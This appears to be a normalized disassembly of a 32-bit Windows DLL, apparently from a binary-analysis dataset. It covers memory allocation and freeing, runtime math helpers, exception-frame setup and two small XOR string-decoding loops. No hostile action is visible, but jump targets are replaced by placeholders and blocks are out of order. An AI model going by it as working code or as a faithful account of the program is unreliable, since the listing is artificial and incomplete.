call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x2c ]
push ebx
push ecx
push eax
mov [ esi + 0xc ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] edi
mov ebx [ ebp - 0x2c ]
cmp ebx edi
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0xe5
call sub_1002f620
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x10 ] eax
jmp r-xdata
push ebx
call [ lstrlenW@IAT ]
lea ebx [ eax + eax ]
lea edx [ ebx + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
mov ecx [ ebp - 0x30 ]
push ebx
push ecx
push eax
mov [ esi + 0x1c ] eax
call sub_1007f580
add esp 0xc
jmp r-xdata
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x1c ] edi
mov ebx [ ebp - 0x30 ]
cmp ebx edi
je r-xdata
mov eax [ ebp - 0x3c ]
cmp eax edi
pop edi
pop ebx
je r-xdata
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x14 ] eax
mov eax [ ebp - 0x40 ]
cmp eax edi
je r-xdata
mov eax [ ebp - 0x44 ]
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10032529
mov esp ebp
pop ebp
retn 0x14
push eax
call sub_10002bd3
add esp 0x4
mov [ esi + 0x18 ] eax
sub_10021ad0
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
push ebx
mov ebx [ LocalFree@IAT ]
push edi
lea esp [ esp ]
mov edx [ esi ]
push edx
call ebx
mov eax [ ebp - 0x4 ]
mov [ esi ] eax
test eax eax
jne r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov eax [ esi ]
mov edi [ eax ]
mov ecx [ eax + 0x4 ]
mov [ ebp - 0x4 ] ecx
test edi edi
je r-xdata
pop edi
pop ebx
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push eax
call ebx
cmp [ edi + 0x10 ] 0x0
je r-xdata
push eax
call ebx
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
mov [ edi + 0x10 ] 0x0
mov eax [ edi + 0x18 ]
test eax eax
je r-xdata
push eax
call ebx
mov eax [ edi + 0x1c ]
test eax eax
je r-xdata
push eax
call ebx
cmp [ edi + 0x50 ] 0x0
je r-xdata
push eax
call ebx
cmp [ edi + 0x54 ] 0x0
lea esi [ edi + 0x54 ]
je r-xdata
mov [ edi + 0x50 ] 0x0
push edi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov esi [ ebp + 0x8 ]
call sub_1001b370
sub_10021b8f
push 0x58
mov eax sub_100853b8
call sub_10047689
mov esi [ ebp + 0x14 ]
test [ esi + 0x14 ] 0x4000
mov edi [ ebp + 0x8 ]
mov al [ ebp + 0x18 ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x54 ] edi
mov [ ebp - 0x50 ] al
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov ecx esi
call sub_10007a10
xor ebx ebx
push eax
mov [ ebp - 0x4 ] ebx
call sub_10067ab7
pop ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x58 ] eax
call sub_1002be90
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov ecx [ ebp - 0x58 ]
xor edi edi
inc edi
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x4 ] edi
push eax
cmp [ ebp + 0x1c ] bl
je r-xdata
movzx edx [ ebp + 0x1c ]
mov eax [ ecx ]
push edx
push [ ebp - 0x50 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call [ eax + 0x1c ]
mov eax edi
jmp r-xdata
call sub_100332a0
mov [ ebp - 0x4 ] 0x3
call sub_1002f75b
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
call sub_100262c3
retn 0x18
xor edi edi
jg r-xdata
push eax
lea ecx [ ebp - 0x2c ]
call sub_1003acf0
push ebx
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_10005b50
mov eax [ esi + 0x20 ]
cmp [ esi + 0x24 ] ebx
jl r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
push edi
push [ ebp - 0x50 ]
lea eax [ ebp - 0x64 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_10019146
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
add esp 0x18
mov [ ebp + 0x10 ] eax
xor edi edi
cmp eax [ ebp - 0x1c ]
jbe r-xdata
cmp eax ebx
jbe r-xdata
push [ ebp - 0x1c ]
push eax
push [ ebp + 0x10 ]
lea eax [ ebp - 0x5c ]
push [ ebp + 0xc ]
push eax
push [ ebp - 0x4c ]
call sub_100293e8
mov ecx [ eax ]
push edi
push [ ebp - 0x50 ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
push eax
push ecx
push [ ebp - 0x54 ]
mov [ ebp + 0x10 ] eax
push [ ebp - 0x4c ]
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
call sub_10019146
add esp 0x30
push ebx
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_10005b50
mov eax [ ebp - 0x54 ]
lea eax [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
mov edi eax
jmp r-xdata
mov eax [ esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
sub_10021cea
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1004579a
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002bc64
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1007233f
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10004286
jmp r-xdata
sub_10021d80
push ebp
mov ebp esp
push 0xffffffff
push sub_10086cb8
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10007a10
push eax
mov [ ebp - 0x4 ] 0x0
call sub_1002bd30
mov [ ebp - 0x4 ] 0xffffffff
mov edi [ ebp - 0x10 ]
add esp 0x4
mov ebx eax
test edi edi
je r-xdata
mov edx [ ebx ]
mov eax [ edx + 0x28 ]
push 0x20
mov ecx ebx
call eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x14 ]
not esi
call sub_10003c9c
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
dec eax
mov [ edi + 0x4 ] eax
sub_10021e27
push 0x28
mov eax sub_10085438
call sub_10026266
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_10008d33
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_1002e3ac
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10025720
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_10060250
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_100575c5
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10021ec0
push ebx
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0xa8 ] 0x8
push edi
jb r-xdata
xor edi edi
mov ebx 0x7
xor ecx ecx
mov [ esi + 0xa8 ] ebx
mov [ esi + 0xa4 ] edi
mov [ esi + 0x94 ] cx
cmp [ esi + 0x8c ] 0x8
jb r-xdata
mov eax [ esi + 0x94 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ esi + 0x8c ] ebx
mov [ esi + 0x88 ] edi
mov [ esi + 0x78 ] ax
cmp [ esi + 0x70 ] 0x8
jb r-xdata
mov edx [ esi + 0x78 ]
push edx
call sub_1000a86e
add esp 0x4
xor edx edx
mov [ esi + 0x70 ] ebx
mov [ esi + 0x6c ] edi
mov [ esi + 0x5c ] dx
cmp [ esi + 0x54 ] 0x8
jb r-xdata
mov ecx [ esi + 0x5c ]
push ecx
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ esi + 0x54 ] ebx
mov [ esi + 0x50 ] edi
mov [ esi + 0x40 ] cx
cmp [ esi + 0x38 ] 0x8
jb r-xdata
mov eax [ esi + 0x40 ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ esi + 0x38 ] ebx
mov [ esi + 0x34 ] edi
mov [ esi + 0x24 ] ax
cmp [ esi + 0x18 ] 0x8
jb r-xdata
mov edx [ esi + 0x24 ]
push edx
call sub_1000a86e
add esp 0x4
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] ebx
xor edx edx
pop edi
mov [ esi + 0x4 ] dx
pop esi
pop ebx
retn
mov ecx [ esi + 0x4 ]
push ecx
call sub_1000a86e
add esp 0x4
sub_10021fa2
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100560bd
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_10021fcf
push 0x8
push r--data
call sub_1007fad0
mov eax [ ebp + 0x10 ]
test [ eax ] 0x80000000
je r-xdata
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
lea ebx [ ecx + edx + 0xc ]
mov ebx [ ebp + 0xc ]
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1000321c
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1003750d
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push eax
push [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
push edi
call sub_1001dfc1
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1007fb15
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_1000321c
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_1003750d
jmp r-xdata
sub_10022070
push ebp
mov ebp esp
sub esp 0x6c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push edi
mov ebx ecx
mov ecx [ r--data ]
xor edi edi
xor eax eax
nop
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff7
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x6c ]
push edx
mov [ ebp - 0x6 ] ax
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x6c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov esi [ ebp - 0x6c ]
call sub_10006970
mov esi eax
mov eax [ ebp - 0x6c ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
cmp esi edi
je r-xdata
mov esi 0x1
lea edx [ ebp - 0x64 ]
lea eax [ esi + 0x47 ]
call sub_1002f620
pop edi
mov eax esi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0x1c ]
lea edx [ ebp - 0x68 ]
push edx
lea edx [ ebp - 0x20 ]
mov [ ebp - 0x68 ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
lea edx [ ebp - 0x64 ]
mov eax 0x48
call sub_1002f620
pop edi
mov eax esi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov esi [ ebx + 0x128 ]
cmp esi edi
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x68 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
lea esp [ esp ]
mov edi [ esi ]
lea ecx [ ebp - 0x68 ]
push ecx
call sub_10050730
mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_100221a0
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_1007fa40
lea esi [ eax + 0x1 ]
push esi
call sub_10021090
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_10042442
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_100221e0
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov eax [ eax + 0xc8 ]
mov ecx [ ebp + 0x8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x10 ]
push eax
push 0x8
push [ ebp + 0x8 ]
call sub_100718ba
add esp 0xc
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10022250
push ebp
mov ebp esp
mov eax edx
push esi
lea esi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
push eax
push edx
call sub_10052290
pop esi
pop ebp
retn 0x4
sub_1002227e
push 0x8
mov eax sub_10085db8
call sub_100259bb
mov esi ecx
mov [ ebp - 0x14 ] esi
call sub_100575c5
lea ebx [ esi + 0x2c ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
call sub_1003d7d5
mov edi eax
xor eax eax
push ebx
push eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] eax
push [ edi + 0x1c ]
mov [ ebp - 0x4 ] eax
call sub_10003340
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0x8 ] eax
je r-xdata
mov eax [ edi + 0x10 ]
mov eax [ edi + 0xc ]
jmp r-xdata
push ebx
push 0x0
push eax
call sub_10003340
mov [ esi + 0x14 ] eax
add esp 0xc
cmp [ edi + 0x2f ] 0x4
mov eax r--data
ja r-xdata
mov eax [ edi + 0x20 ]
push ebx
push 0x0
push eax
call sub_10003340
mov [ esi + 0x10 ] eax
add esp 0xc
cmp [ edi + 0x2e ] 0x4
mov eax r--data
ja r-xdata
push ebx
push 0x0
push eax
call sub_10003340
mov [ esi + 0x18 ] eax
mov eax [ edi + 0x14 ]
mov al [ eax ]
mov [ esi + 0xc ] al
mov eax [ edi + 0x18 ]
mov al [ eax ]
add esp 0xc
cmp [ esi + 0x28 ] 0x0
mov [ esi + 0xd ] al
je r-xdata
mov eax [ edi + 0x24 ]
mov al [ edi + 0x29 ]
mov al [ edi + 0x28 ]
jmp r-xdata
and [ esi + 0x1c ] 0x0
cmp eax 0x7f
jl r-xdata
movsx eax al
mov [ esi + 0x1c ] eax
test eax eax
js r-xdata
call sub_10008d33
retn 0x8
push 0x4
mov esi r--data
push esi
push ebx
call sub_1007f580
push 0x4
push esi
push [ ebp - 0x14 ]
call sub_1007f580
add esp 0x18
movsx eax [ edi + 0x2e ]
push eax
movsx eax [ edi + 0x2a ]
push eax
movsx eax [ edi + 0x2b ]
push eax
lea ebx [ esi + 0x20 ]
push ebx
mov ecx esi
call sub_100676d2
movsx ecx [ edi + 0x2f ]
push ecx
movsx ecx [ edi + 0x2c ]
push ecx
movsx ecx [ edi + 0x2d ]
lea eax [ esi + 0x24 ]
push ecx
push eax
mov ecx esi
mov [ ebp - 0x14 ] eax
call sub_100676d2
cmp [ ebp + 0xc ] 0x0
je r-xdata
sub_100223bf
mov edi edi
push ebp
mov ebp esp
push [ ecx + 0x8 ]
lea eax [ ebp + 0x14 ]
push 0x0
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_100124be
add esp 0x10
test eax eax
jns r-xdata
mov ecx [ ebp + 0x24 ]
sar eax 0x1
mov [ ecx + 0x18 ] eax
mov eax [ ebp + 0x20 ]
or [ eax ] 0x2
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
pop ebp
retn 0x20
sub_100223ff
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_1003d5da
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
pop ecx
sub_10022420
push ebp
mov ebp esp
push 0xffffffff
push sub_10086448
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_1000c927
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov edi [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_10004aa4
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10003c9c
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_1004b2e0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp + 0x8 ]
mov [ rw-data ] esi
call sub_1000c927
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_100661c2
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10055e2a
lea ecx [ ebp + 0x8 ]
call sub_10003c9c
push esi
call sub_10008715
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_1002255a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_1001b2d2
pop ecx
sub_100225a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100879b1
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0xc ]
mov edi ecx
xor ebx ebx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x1
cmp esi ebx
je r-xdata
sub esi 0xffffff80
mov [ ebp - 0x4 ] bl
mov [ ebp + 0xc ] esi
sub edi 0xffffff80
jmp r-xdata
push esi
call sub_1000a880
cmp edi [ ebp + 0x8 ]
je r-xdata
sub_100225fc
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
xor ebx ebx
push ebx
push ebx
call sub_10055e2a
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_10051380
sub esi 0xffffff80
cmp esi edi
jne r-xdata
sub_1002262f
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push edi
mov esi 0xffff
push esi
push 0x133f
call sub_1001fcf4
fld [ ebp + 0x8 ]
pop ecx
pop ecx
movzx ecx [ ebp + 0xe ]
mov edi eax
mov eax 0x7ff0
and ecx eax
cmp cx ax
jne r-xdata
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
push ecx
push ecx
fstp [ esp ]
call sub_100689d0
pop ecx
pop ecx
test eax eax
jle r-xdata
push esi
push edi
call sub_1001fcf4
pop ecx
pop ecx
jmp r-xdata
fld [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1001f2f1
mov eax [ ebp + 0x10 ]
mov ecx [ ebp - 0x4 ]
add esp 0xc
test eax eax
jns r-xdata
fld [ ebp + 0x8 ]
push edi
fadd [ r--data ]
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x8
cmp eax 0x2
jle r-xdata
fld [ ebp + 0x8 ]
mov edx 0x7fffffff
sub edx eax
cmp ecx edx
jg r-xdata
mov edx 0x80000000
sub edx eax
cmp ecx edx
jl r-xdata
pop edi
pop esi
leave
retn
cmp eax 0x3
jne r-xdata
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ rw-data ]
fstp [ esp ]
call sub_10011d03
fstp [ esp + 0x8 ]
fild [ ebp + 0x10 ]
fstp [ esp ]
push ecx
push ecx
add eax ecx
cmp eax 0xa00
jle r-xdata
fmul [ r--data ]
jmp r-xdata
fild [ ebp + 0x10 ]
push edi
sub esp 0x10
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
call sub_1002157b
add esp 0x18
jmp r-xdata
call sub_10019802
add esp 0x24
jmp r-xdata
cmp eax 0x400
jle r-xdata
cmp eax 0xfffff603
jge r-xdata
add eax 0xfffffa00
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10051d7c
add esp 0xc
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
jmp r-xdata
cmp eax 0xfffffc03
jge r-xdata
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x11
jmp r-xdata
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10051d7c
push esi
fstp [ ebp + 0x8 ]
push edi
call sub_1001fcf4
add esp 0x14
add eax 0x600
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10051d7c
add esp 0xc
jmp r-xdata
push edi
sub esp 0x18
fstp [ esp + 0x10 ]
fild [ ebp + 0x10 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0x8 ]
fstp [ esp ]
push 0x19
push 0x12
jmp r-xdata
sub_100227f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10088866
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2f8
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
mov [ ebp - 0x2ec ] eax
mov edi edx
mov [ ebp - 0x2f0 ] edi
mov [ ebp - 0x300 ] eax
mov [ ebp - 0x2fc ] eax
mov [ ebp - 0x2f8 ] eax
mov edx 0x7
mov esi 0x1
mov [ ebp - 0x4 ] esi
xor ebx ebx
mov [ ebp - 0x2c8 ] edx
mov [ ebp - 0x2ac ] edx
mov [ ebp - 0x28c ] edx
mov [ ebp - 0x270 ] edx
xor edx edx
mov [ ebp - 0x2cc ] eax
mov [ ebp - 0x2dc ] bx
mov [ ebp - 0x2b0 ] eax
mov [ ebp - 0x2c0 ] bx
mov [ ebp - 0x290 ] eax
mov [ ebp - 0x2a0 ] bx
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x284 ] dx
mov [ ebp - 0x4 ] 0x2
mov [ edi ] eax
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] eax
mov [ ebp - 0x2e8 ] eax
mov [ ebp - 0x2e4 ] eax
lea eax [ ebp - 0x300 ]
mov [ ebp - 0x2ec ] esi
push eax
lea ebx [ ebp - 0x2e4 ]
lea esi [ ebp - 0x2e8 ]
call sub_1003e070
mov cl [ ebp + 0x8 ]
add esp 0x4
mov [ ebp - 0x2dd ] cl
mov ecx [ r--data ]
mov [ ebp - 0x2e8 ] 0x1
xor eax eax
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0x3c
and edx 0xff
mov [ ebp + eax * 2 - 0x50 ] dx
inc eax
cmp eax 0x1d
jb r-xdata
mov ecx [ ebp - 0x2ec ]
mov esi [ ebp - 0x300 ]
mov ebx [ ebp - 0x2fc ]
push ecx
xor eax eax
push esi
mov ecx ebx
mov [ ebp - 0x16 ] ax
call sub_10028c10
add esp 0x8
mov [ ebp - 0x2e4 ] esi
cmp esi ebx
je r-xdata
lea esi [ ebp - 0x2dc ]
call sub_10051380
mov eax [ ebp - 0x300 ]
test eax eax
je r-xdata
lea ecx [ ecx ]
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov esi eax
cmp eax ebx
je r-xdata
add esi 0x1c
mov [ ebp - 0x2e4 ] esi
cmp esi ebx
jne r-xdata
mov eax [ ebp - 0x2e8 ]
push eax
lea ecx [ ebp - 0x50 ]
push ecx
mov ecx 0x25
lea ebx [ ebp - 0x25c ]
call sub_1006d3c0
mov eax ebx
add esp 0x8
lea edx [ eax + 0x2 ]
lea esp [ esp ]
push eax
call sub_1000a86e
add esp 0x4
cmp [ esi + 0x14 ] 0x10
jb r-xdata
lea edx [ ebp - 0x2dc ]
push edx
mov ecx esi
call sub_10022ce0
add esp 0x4
test eax eax
jne r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x25c ]
push edx
lea ecx [ ebp - 0x2dc ]
call sub_10034100
mov al [ ebp - 0x2dd ]
mov [ ebp - 0x268 ] al
mov eax [ edi + 0x4 ]
lea ecx [ ebp - 0x2dc ]
cmp ecx eax
jae r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x1c
cmp esi ebx
jne r-xdata
mov edx [ esi ]
push edx
call sub_1000a86e
mov eax [ ebp - 0x300 ]
add esp 0x4
